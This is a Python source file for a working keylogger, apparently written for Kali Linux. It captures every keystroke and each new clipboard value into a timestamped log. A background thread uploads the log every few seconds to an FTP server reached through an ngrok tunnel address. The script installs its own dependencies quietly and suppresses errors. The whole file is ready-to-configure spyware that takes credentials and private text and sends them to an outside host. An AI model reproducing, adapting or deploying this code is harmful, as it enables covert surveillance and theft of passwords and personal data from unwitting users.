#!/usr/bin/python3

# _*_ coding: utf-8 _*_


#tested on Linux (Linux kali 6.5.0-kali2-amd64)

# to do:
# logging keystrokes of virtual keyboard
# port forwarding


# fixed:
# thousands of connection to 1 server (Now the data are sent within a single socket connection)

# New:
# It sends the file to a ftp server


try:
    from os import system
    import threading
    #import socket
    from pynput import keyboard  #type: ignore
    from pyperclip import paste   # for getting the clipboard data (supports cross platform)  
    from datetime import datetime

    # encryption and encoding
    #import rsa
    #from base64 import b64encode
    from ftplib import FTP   # for sending the data to the ftp server
    from time import sleep
except:
    #two dependencies pynput and pandas ['-q' for quite mode]
    system('pip install -q pynput')
    system('pip install -q pyperclip')
    system('pip install -q rsa')
    system('pip install -q ftplib')



# <-- Initializing global values -->

# change this
SERVER_ADDRESS = ('0.tcp.in.ngrok.io',19650)    # replace the IP with your server's IP 
INTERVAL = 5                                    # set interval according to your requirement
USER = ''                                       # FTP Username
PASSWD = ''                                     # FTP Password



# no change required
duplicate = ['']
FILENAME = f'{datetime.now().strftime("%d%m%Y%H%M%S")}.log'  # unix oriented [.19062024132058.log]


#keystroke record
class keylogger:

    # init
    def __init__(self):
        pass

    '''def __init__(self):
        #connecting to the server
        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[1])))

        # receive and deserialize the RSA public key from the server
        self.serialized_publickey = self.server.recv(4096).decode()
        self.publickey = rsa.PublicKey.load_pkcs1(self.serialized_publickey)

        # closing the connection after getting the public key
        self.server.close()'''


    # saving the file
    def savefile(self,data):
        try:
            with open(FILENAME,'a+') as fh:
                #encrypted_data = b64encode(rsa.encrypt(data.encode(), self.publickey))   # encrypting and storing
                #fh.write(str(encrypted_data))
                fh.write(str(data))
        except:
            pass
    

    def Keylogging(self):
        def on_key_press(key):
            try:
                # to get the clipboard data
                data = paste()

                if data != duplicate[0]:
                    self.savefile(f'Clipboard data: {data}\n')
                    duplicate[0] = data

                # logging the keystrokes
                self.savefile(f'{str(key)}\n')

            except:
                pass


        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()


    # destructor
    def __del__(self):
        pass


# send the file to the ftp server at regular interval
class ftpuploader:
    
    # init
    def __init__(self):
        self.ftp = FTP()
        self.ftp.connect(SERVER_ADDRESS[0], SERVER_ADDRESS[1])  # Connect to the FTP server
        self.ftp.login(user=USER, passwd=PASSWD)
    
    def upload_file_periodically(self):
        while True:
            sleep(INTERVAL)
            
            try:
                with open(FILENAME, 'rb') as fh:
                    self.ftp.storbinary(f'STOR {FILENAME}', fh)   # sending the file to the ftp server
            
            except Exception as e:
                pass

    # ftp close
    def __del__(self):
        self.ftp.quit()




if __name__=='__main__':
    try:
        # creating objects
        keylogger  = keylogger()
        ftp_uploader = ftpuploader()

        # <---  implementing threading  ---> 
       
        # starting the keylogger and daemon = True (to run it in the background)
        keylogger_thread = threading.Thread(target = keylogger.Keylogging,daemon = True)
        keylogger_thread.start() 


        # sending file periodically and daemon = True (to run it in the background)
        ftp_uploader_thread = threading.Thread(target = ftp_uploader.upload_file_periodically, daemon = True)
        ftp_uploader_thread.start()


        keylogger_thread.join()
        ftp_uploader_thread.join()   
    
    except KeyboardInterrupt:
        pass

